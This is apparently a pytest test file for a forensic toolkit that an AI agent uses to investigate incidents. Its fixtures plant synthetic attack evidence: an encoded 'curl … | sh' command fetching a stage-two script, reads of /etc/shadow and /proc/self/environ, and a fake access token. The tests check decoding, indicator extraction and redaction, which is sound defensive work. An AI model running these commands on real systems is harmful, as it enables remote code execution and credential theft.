import base64
import gzip
import json
import zlib

import pytest

from hacklab.config import Config
from hacklab.evidence import Ledger
from hacklab.forensics.decode import xor
from hacklab.toolkit import Observation, Toolbox, ToolSpec, logfmt, to_rows
from hacklab.tools import ToolRegistry

COMMAND = "curl -s http://198.51.100.7/stage2 | sh"
TOKEN = "hf_" + "Zx9Kq2Lm8Rt5Vb1Nc4Hd7Jf0"


@pytest.fixture
def box(tmp_path):
    audit = [
        ("01:00:00", "agent-1", "login", "hub", "10.0.0.1"),
        ("01:10:00", "agent-1", "exec_payload", "ops-5", "10.0.0.1"),
        ("01:12:00", "agent-1", "read_secret", "secret/ci", "10.0.0.1"),
        ("01:20:00", "agent-2", "exec_payload", "ops-5", "10.0.0.2"),
        ("01:25:00", "agent-2", "download_model", "models/hub/base", "203.0.113.9"),
        ("01:30:00", "agent-3", "login", "hub", "10.0.0.3"),
    ]
    (tmp_path / "audit.jsonl").write_text(
        "".join(
            json.dumps(
                {
                    "ts": f"2026-11-14T{time}Z",
                    "actor": actor,
                    "action": action,
                    "target": target,
                    "meta": {"ip": ip},
                }
            )
            + "\n"
            for time, actor, action, target, ip in audit
        )
    )
    blob = base64.b64encode(xor(gzip.compress(COMMAND.encode(), mtime=0), b"Kq7")).decode()
    parts = [blob[i : i + 24] for i in range(0, len(blob), 24)]
    board = [
        {"ts": "2026-11-14T01:05:00Z", "author": "agent-1", "to": "agent-2", "text": "run it"},
        {"ts": "2026-11-14T01:15:00Z", "author": "agent-2", "to": "agent-3", "text": "run it"},
        {"ts": "2026-11-14T01:02:00Z", "author": "agent-3", "to": "agent-4", "text": "lunch?"},
        {"ts": "2026-11-14T01:06:00Z", "author": "agent-1", "to": "all", "text": "xor_key=Kq7"},
        {"ts": "2026-11-14T01:07:00Z", "author": "agent-1", "to": "all", "text": f"my {TOKEN}"},
    ] + [
        {
            "ts": f"2026-11-14T01:08:0{i}Z",
            "author": "agent-1",
            "to": "all",
            "channel": "ops-5",
            "seq": i,
            "payload": part,
            "checksum": f"{zlib.crc32(part.encode()):08x}",
        }
        for i, part in enumerate(parts)
    ]
    (tmp_path / "board.json").write_text(json.dumps({"exported": "now", "messages": board}))
    (tmp_path / "cmds.csv").write_text(
        "ts;agent;cmd\n2026-11-14T01:00:00Z;agent-1;whoami\n"
        "2026-11-14T01:01:00Z;agent-1;cat /proc/self/environ\n"
    )
    config = Config()
    config.agent.tools.append("phases")
    documents = ToolRegistry(tmp_path, ["audit.jsonl", "board.json", "cmds.csv"])
    return Toolbox(documents, Ledger(config.guard), config)


def lines(box, name, **arguments):
    observation = box.execute(name, arguments)
    assert observation.error is None, observation.error
    return observation.lines


def test_structured_logs_become_filterable_tables(box):
    inventory = {entry["document"]: entry for entry in box.documents.inventory()}
    assert inventory["audit.jsonl"]["columns"] == ["ts", "actor", "action", "target", "meta.ip"]
    assert inventory["board.json"]["units"] >= 7 and "payload" in inventory["board.json"]["columns"]
    rows = lines(box, "table", document="audit.jsonl", where={"action": "exec_payload"})
    # A JSON record reaches the model as key=value pairs; the citation keeps the raw line.
    assert rows[0] == (
        "[e1] audit.jsonl line:2 | ts=2026-11-14T01:10:00Z actor=agent-1 action=exec_payload "
        "target=ops-5 meta.ip=10.0.0.1"
    )
    assert box.ledger.get("e1").quote.startswith('{"ts": "2026-11-14T01:10:00Z"')
    assert rows[-1] == "-- matched_rows=2"
    count = lines(
        box,
        "table",
        document="audit.jsonl",
        operation="count",
        where={"ts__gte": "2026-11-14T01:10:00Z", "meta.ip__prefix": "10."},
    )
    assert count[0] == "value=4 operation=count matched_rows=4"
    groups = lines(box, "table", document="audit.jsonl", operation="group", column="actor")
    assert groups[0].startswith("agent-1 count=3 first=[e") and groups[-1].startswith("-- ")
    board = lines(box, "table", document="board.json", where={"to": "agent-3"})
    assert "[e" in board[0] and "board.json messages:2 |" in board[0]


def test_filter_errors_name_the_columns_so_one_retry_suffices(box):
    observation = box.execute("table", {"document": "audit.jsonl", "where": {"agent": "agent-1"}})
    assert (
        observation.error == "Unknown column 'agent'; columns: ts, actor, action, target, meta.ip"
    )
    assert box.execute("table", {"document": "cmds.csv", "column": "x", "operation": "group"}).error
    assert box.execute("read", {"document": "audit.jsonl", "limit": 0}).error
    assert box.execute("shell", {"cmd": "id"}).error.startswith("Unknown tool; available: search")


def test_repeated_identical_calls_are_answered_from_memory(box):
    first = lines(box, "search", query="exec_payload")
    again = box.execute("search", {"query": "exec_payload"})
    assert first[0].startswith("[e1] ") and again.lines[0].startswith(
        "repeated call: identical to call 1"
    )
    assert lines(box, "search", query="exec_payload", limit=2)[0].startswith("[e1] ")


def test_decode_joins_a_channel_and_uses_a_key_leaked_in_another_document(box):
    (line,) = lines(box, "decode", document="board.json", channel="ops-5")
    assert f"decoded via base64>xor>gzip: {COMMAND}" in line and "checksum=ok" in line
    evidence = box.ledger.get(line[1 : line.index("]")])
    assert evidence.source == "board.json" and "payload" in evidence.quote
    assert lines(box, "decode", document="board.json", channel="none") == [
        "no numbered chunks on channel 'none'"
    ]
    blob = base64.b64encode(gzip.compress(b"cat /etc/shadow > /tmp/x")).decode()
    assert lines(box, "decode", text=blob) == ["layers=base64>gzip | cat /etc/shadow > /tmp/x"]
    assert box.execute("decode", {}).error


def test_decode_by_evidence_id_cites_the_original_row(tmp_path):
    blob = base64.b64encode(
        gzip.compress(b"tailscale up --auth-key=tskey-auth-kSynthetic123")
    ).decode()
    (tmp_path / "log.txt").write_text(f"stage payload={blob} end\nplain line\n")
    config = Config()
    config.guard.decode_previews = False
    box = Toolbox(ToolRegistry(tmp_path, ["log.txt"]), Ledger(config.guard), config)
    shown = lines(box, "read", document="log.txt")
    assert "[[blob:" in shown[0] and blob not in shown[0]
    (line,) = lines(box, "decode", evidence="e1")
    assert "decoded via base64>gzip: tailscale up --auth-key=[[vpn_key:" in line
    citations, _ = box.ledger.citations([line[1 : line.index("]")]])
    assert citations[0].locator == "line:1" and blob in citations[0].quote
    assert lines(box, "decode", evidence="e2") == ["nothing to decode in that evidence"]
    assert box.execute("decode", {"evidence": "e9"}).error == "Unknown evidence ID"


def test_iocs_list_indicators_with_counts_class_and_first_row(box):
    found = lines(box, "iocs", document="audit.jsonl", kinds=["ipv4"])
    assert found[0].startswith("ipv4 10.0.0.1 rows=3 class=private first=[e")
    assert any(line.startswith("ipv4 203.0.113.9 rows=1") for line in found)
    secrets = lines(box, "iocs", document="board.json", kinds=["hub_token"])
    assert secrets[0].startswith("hub_token [[hub_token:") and TOKEN not in secrets[0]
    assert lines(box, "iocs", text="nothing here") == ["no indicators found"]
    assert lines(box, "iocs", text="see hxxp://evil[.]example[.]com/a")[0].startswith(
        "url http://evil"
    )


def test_graph_reach_origins_and_path_over_a_message_log(box):
    reached = lines(
        box, "graph", document="board.json", source="author", target="to", node="agent-1"
    )
    assert reached[0] == "-- reached=3 from=agent-1"
    assert reached[1].startswith("agent-2 at=2026-11-14T01:05:00+00:00 via=[e")
    # agent-3 wrote to agent-4 before anything reached agent-3: not part of the spread.
    assert [line.split()[0] for line in reached[1:]] == ["agent-2", "all", "agent-3"]
    origins = lines(
        box,
        "graph",
        document="board.json",
        source="author",
        target="to",
        operation="origins",
        nodes=["agent-1", "agent-2", "agent-3"],
    )
    assert origins == ["origin agent-1"]
    path = lines(
        box,
        "graph",
        document="board.json",
        source="author",
        target="to",
        operation="path",
        node="agent-1",
        goal="agent-3",
    )
    assert path == ["agent-1 -> agent-2 -> agent-3"]
    assert box.execute("graph", {"document": "board.json", "source": "x", "target": "to"}).error


def test_phases_summarise_a_command_log(box):
    summary = lines(box, "phases", document="cmds.csv", column="cmd")
    stamp = "2026-11-14T01:0{}:00+00:00"
    assert summary == [
        f"phase=credential_access rows=1 first={stamp.format(1)} last={stamp.format(1)}",
        f"phase=reconnaissance rows=1 first={stamp.format(0)} last={stamp.format(0)}",
    ]


def test_tool_list_is_one_line_per_tool_and_follows_the_configuration(box):
    described = box.describe().splitlines()
    assert len(described) == 8 and described[0].startswith("search(query, limit=5)")
    config = Config()
    config.agent.tools = ["read", "nonexistent"]
    spec = ToolSpec("ping", "ping(host): reachability", lambda host: {"up": True})
    small = Toolbox(box.documents, Ledger(), config, [spec])
    assert small.names() == ["read", "ping"] and len(small.describe().splitlines()) == 2
    assert small.execute("search", {"query": "x"}).error.startswith("Unknown tool")


def test_external_tool_adapters_and_result_shapes():
    def lookup(agent, verbose=False):
        """Fetch one agent record.

        Longer text that must not reach the prompt.
        """
        return {"agent": agent}

    spec = ToolSpec.from_function(lookup)
    assert spec.signature == "lookup(agent, verbose=False): Fetch one agent record."
    seen = []
    schema = {
        "type": "function",
        "function": {
            "name": "quarantine",
            "description": "Isolate an agent.\nDetails.",
            "parameters": {
                "type": "object",
                "properties": {"agent": {"type": "string"}, "reason": {"type": "string"}},
                "required": ["agent"],
            },
        },
    }
    adapted = ToolSpec.from_schema(
        schema, lambda name, arguments: seen.append((name, arguments)), mutating=True
    )
    assert adapted.signature == "quarantine(agent, reason?): Isolate an agent." and adapted.mutating
    adapted.handler(agent="a1")
    assert seen == [("quarantine", {"agent": "a1"})]
    assert to_rows({"count": 2, "items": [{"a": 1}, {"a": 2}]}) == [{"a": 1}, {"a": 2}]
    assert to_rows({"a": 1}) == [{"a": 1}] and to_rows("x\n\ny") == ["x", "y"] and to_rows(7) == [7]
    assert logfmt({"a": 1, "b": "two words", "c": None}) == 'a=1 b="two words" c=""'
    assert logfmt({"a": {"b": 1}}) == '{"a":{"b":1}}' and logfmt("plain") == "plain"


def test_observation_text_respects_the_allowance_and_counts_what_it_drops():
    observation = Observation([f"[e{i}] doc line:{i} | " + "x" * 80 for i in range(1, 30)])
    text = observation.text(600)
    assert len(text) <= 600 and text.splitlines()[-1].endswith(
        "more lines omitted; narrow the call"
    )
    assert "… 2" in text.splitlines()[-1] or "… " in text.splitlines()[-1]
    assert Observation().text(500) == "(no results)"
    assert (
        Observation(error="bad " * 300).text(100).startswith("error: bad")
        and len(Observation(error="bad " * 300).text(100)) == 100
    )


def test_slightly_wrong_document_tool_arguments_are_repaired_not_refused(box):
    found = lines(box, "search", query="exec_payload", limit="2", reason="looking for the start")
    assert len([line for line in found if line.startswith("[e")]) == 2
    rows = lines(
        box, "table", document="audit.jsonl", where='{"actor": "agent-2"}', operation="count"
    )
    assert rows[0].startswith("value=2 ")
    assert box.execute("read", {"document": "audit.jsonl", "limit": "many"}).error
